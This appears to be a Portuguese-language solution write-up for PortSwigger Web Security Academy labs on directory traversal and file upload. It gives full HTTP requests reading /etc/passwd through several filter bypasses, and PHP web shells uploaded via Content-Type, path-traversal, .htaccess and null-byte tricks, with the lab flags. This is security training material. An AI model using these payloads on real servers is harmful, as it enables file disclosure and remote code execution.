# Exercises

## Directory traversal

### >> 1. File path traversal, simple case
Crie uma requisição GET contendo o caminho do arquivo a ser lido
````http
GET /image?filename=../../../etc/passwd HTTP/1.1
Host: ac611f7c1ebca4cec0b52379003e009f.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 2. File path traversal, traversal sequences blocked with absolute path bypass
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=/etc/passwd HTTP/1.1
Host: ac601f011f09bc6dc05120b5004a00fa.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 3. File path traversal, traversal sequences stripped non-recursively
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=....//....//....//....//etc//passwd HTTP/1.1
Host: acb91f041e530947c0f6088a004200cf.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 4. File path traversal, traversal sequences stripped with superfluous URL-decode
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: ace71f641fb2b647c042061a009f000c.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 5. File path traversal, validation of start of path
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
Host: ac161f371e40f5e0c054e80a00050088.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````

### >> 6. File path traversal, validation of file extension with null byte bypass
Crie uma requisição GET contendo o caminho do arquivo a ser lido

````http
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
Host: ac491fa91eae86f5c0c5043900fb008a.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close


````



## File upload vulnerabilities 

### >> 1. Remote code execution via web shell upload
Crie um arqvuio com o conteudo:
````php
 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````
Submeta o arquivo via upload de imagens e acesse o arquivo submetido através do link informado.

`Flag: 0sehBXVzLAZHtNFAuMJmIlFDR3UGAx5s`

### >> 2. Web shell upload via Content-Type restriction bypass
Crie um arquivo com o conteudo:
````php
 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````
Submeta o arquivo via upload de imagens 

Encaminhe a request para repeater e altera o header de:

````http
------WebKitFormBoundarySAtt4ZPtNsBRhSWY
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: application/octet-stream

 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````

````http
------WebKitFormBoundarySAtt4ZPtNsBRhSWY
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: image/jpeg

 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````

e acesse o arquivo submetido através do link informado.

`Flag: iiVfQK3LlDuvm0uskl9M2nHoeSEX4JrA`

### >> 3. Web shell upload via path traversal
Crie um arquivo com o conteudo
````php
 <?php echo file_get_contents('/home/carlos/secret'); ?> 
````

Submeta o arquivo para upload e acesse pelo navegador
````http

------WebKitFormBoundarywl7b3A4o80gjAjZb
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fwebshell2.php"
Content-Type: image/png

 <?php echo file_get_contents('/home/carlos/secret'); ?> 
------WebKitFormBoundarywl7b3A4o80gjAjZb
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarywl7b3A4o80gjAjZb
Content-Disposition: form-data; name="csrf"

D3cLNSSIkUUvvKdxO0LsCy8ryg6CxhH7
------WebKitFormBoundarywl7b3A4o80gjAjZb--
````

`Flag: XkJTTpCMVsexpPb2EkLhZpRnuIhc7D1h`

### >> 4. Web shell upload via extension blacklist bypass

Crie um arquivo .htaccess com permissao de execucao php para shtml
````apache
<Files *.shtml>
ForceType application/x-httpd-php
</Files>
````

Crie um arquivo webshell
````php
<?php echo file_get_contents('/home/carlos/secret'); ?>
````

````htttp
------WebKitFormBoundarye3lspOAogkMjAhO7
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

<Files *.shtml>
ForceType application/x-httpd-php
</Files>
------WebKitFormBoundarye3lspOAogkMjAhO7
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundarye3lspOAogkMjAhO7
Content-Disposition: form-data; name="csrf"

t4wvyamnWaFWHez4TJd9SQxZUXxYSLI6
------WebKitFormBoundarye3lspOAogkMjAhO7--
````

````http
------WebKitFormBoundaryid3hJcJV3tX9G7VB
Content-Disposition: form-data; name="avatar"; filename="webshell.shtml"
Content-Type: image/png

 <?php echo file_get_contents('/home/carlos/secret'); ?> 
------WebKitFormBoundaryid3hJcJV3tX9G7VB
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryid3hJcJV3tX9G7VB
Content-Disposition: form-data; name="csrf"

t4wvyamnWaFWHez4TJd9SQxZUXxYSLI6
------WebKitFormBoundaryid3hJcJV3tX9G7VB--
````

### >> 5. Web shell upload via obfuscated file extension

Crie uma requisição com o nome do arquivo modificado para atender os requisitos
````http
------WebKitFormBoundary2NUJ0mu3fL0Qhb2U
Content-Disposition: form-data; name="avatar"; filename="webshell.php%00.png"
Content-Type: application/octet-stream

 <?php echo file_get_contents('/home/carlos/secret'); ?> 
------WebKitFormBoundary2NUJ0mu3fL0Qhb2U
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary2NUJ0mu3fL0Qhb2U
Content-Disposition: form-data; name="csrf"

Ra1gXgVnwyebhHPsi3FWWSNBfY14epng
------WebKitFormBoundary2NUJ0mu3fL0Qhb2U--
````
